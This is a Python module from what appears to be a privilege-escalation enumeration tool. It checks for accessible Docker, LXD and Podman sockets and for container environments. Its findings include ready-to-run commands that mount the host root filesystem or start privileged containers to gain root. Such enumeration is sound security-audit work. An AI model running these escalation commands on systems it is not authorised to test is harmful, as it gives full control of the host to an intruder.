"""
Containers Enumerator
=====================

Enumerate container-related privilege escalation vectors.

Docker socket access and LXD group membership can lead to
full root access on the host system.
"""

import os
from typing import Optional

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class ContainersEnumerator(BaseEnumerator):
    """
    Enumerate container-related privilege escalation vectors.

    Checks:
    - Docker socket accessibility
    - Docker group membership
    - LXD/LXC access
    - Podman socket
    - Container escape indicators
    """

    name = "Containers Enumerator"
    description = "Find container-based privilege escalation paths"

    def enumerate(self) -> None:
        """Run containers enumeration"""
        self.print_header()

        self._check_docker_socket()
        self._check_docker_binary()
        self._check_lxd()
        self._check_podman()
        self._check_if_container()

    def _check_docker_socket(self) -> None:
        """Check if Docker socket is accessible"""
        self.log("Checking Docker socket...")

        docker_sockets = [
            '/var/run/docker.sock',
            '/run/docker.sock'
        ]

        for sock_path in docker_sockets:
            if os.path.exists(sock_path):
                self.log(f"Docker socket found: {sock_path}")

                if os.access(sock_path, os.R_OK) and os.access(sock_path, os.W_OK):
                    self.log(f"Docker socket is ACCESSIBLE!", "critical")

                    self.add_finding(
                        category="Accessible Docker Socket",
                        severity=FindingSeverity.CRITICAL,
                        finding=f"Docker socket accessible: {sock_path}",
                        exploitation=(
                            "Mount host filesystem in container:\n"
                            "  docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n"
                            "Or create privileged container:\n"
                            "  docker run --privileged --rm -it alpine sh"
                        ),
                        impact="Critical - Full root access to host",
                        target=sock_path
                    )
                else:
                    self.log(f"Docker socket exists but not accessible", "info")

                return

        self.log("Docker socket not found", "info")

    def _check_docker_binary(self) -> None:
        """Check Docker binary availability and permissions"""
        self.log("Checking Docker binary...")

        output = self.run_command("which docker 2>/dev/null")

        if not output:
            self.log("Docker binary not found")
            return

        self.log(f"Docker binary: {output}")

        # Try to run docker
        docker_test = self.run_command("docker ps 2>/dev/null")

        if docker_test is not None:
            self.log("Docker command executes successfully!", "success")

            if "CONTAINER" in (docker_test or ''):
                self.add_finding(
                    category="Docker Access",
                    severity=FindingSeverity.CRITICAL,
                    finding="User can execute Docker commands",
                    exploitation=(
                        "Spawn root shell:\n"
                        "  docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    ),
                    impact="Critical - Full host access via Docker",
                    target="docker"
                )

    def _check_lxd(self) -> None:
        """Check LXD/LXC access"""
        self.log("Checking LXD/LXC...")

        lxd_socket = '/var/snap/lxd/common/lxd/unix.socket'

        if os.path.exists(lxd_socket):
            if os.access(lxd_socket, os.R_OK):
                self.log("LXD socket is accessible!", "critical")

                self.add_finding(
                    category="Accessible LXD Socket",
                    severity=FindingSeverity.CRITICAL,
                    finding=f"LXD socket accessible: {lxd_socket}",
                    exploitation=(
                        "Exploit LXD for root:\n"
                        "  lxc init ubuntu:18.04 privesc -c security.privileged=true\n"
                        "  lxc config device add privesc host-root disk source=/ path=/mnt/root\n"
                        "  lxc start privesc\n"
                        "  lxc exec privesc -- /bin/sh"
                    ),
                    impact="Critical - Full host root access",
                    target=lxd_socket
                )

        lxc_path = self.run_command("which lxc 2>/dev/null")

        if lxc_path:
            self.log(f"LXC binary: {lxc_path}")

    def _check_podman(self) -> None:
        """Check Podman access"""
        self.log("Checking Podman...")

        podman_socket = '/run/podman/podman.sock'

        if os.path.exists(podman_socket):
            if os.access(podman_socket, os.R_OK):
                self.log("Podman socket accessible!", "warning")

                self.add_finding(
                    category="Accessible Podman Socket",
                    severity=FindingSeverity.HIGH,
                    finding=f"Podman socket accessible: {podman_socket}",
                    exploitation=(
                        "Exploit similar to Docker:\n"
                        "  podman run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    ),
                    impact="High - Potential host access",
                    target=podman_socket
                )

        podman_path = self.run_command("which podman 2>/dev/null")

        if podman_path:
            self.log(f"Podman binary: {podman_path}")

    def _check_if_container(self) -> None:
        """Check if we're running inside a container"""
        self.log("Checking if running in container...")

        indicators = []

        if os.path.exists('/.dockerenv'):
            indicators.append('/.dockerenv exists')

        try:
            with open('/proc/1/cgroup', 'r') as f:
                cgroup = f.read()
                if 'docker' in cgroup or 'lxc' in cgroup:
                    indicators.append('Container cgroup detected')
        except:
            pass

        container_env_vars = ['container', 'KUBERNETES_SERVICE_HOST']
        for var in container_env_vars:
            if var in os.environ:
                indicators.append(f'Environment variable: {var}')

        if indicators:
            self.log("Running inside a container!", "warning")
            for indicator in indicators:
                self.log(f"  - {indicator}")

            self.add_finding(
                category="Container Environment",
                severity=FindingSeverity.INFO,
                finding="Running inside a container",
                exploitation=(
                    "Container escape techniques:\n"
                    "  1. Check for privileged mode\n"
                    "  2. Check for mounted docker socket\n"
                    "  3. Check for writable cgroups\n"
                    "  4. Check for kernel exploits"
                ),
                impact="Info - May enable container escape",
                target="container",
                indicators=indicators
            )
        else:
            self.log("Not running in a container (or well-hidden)")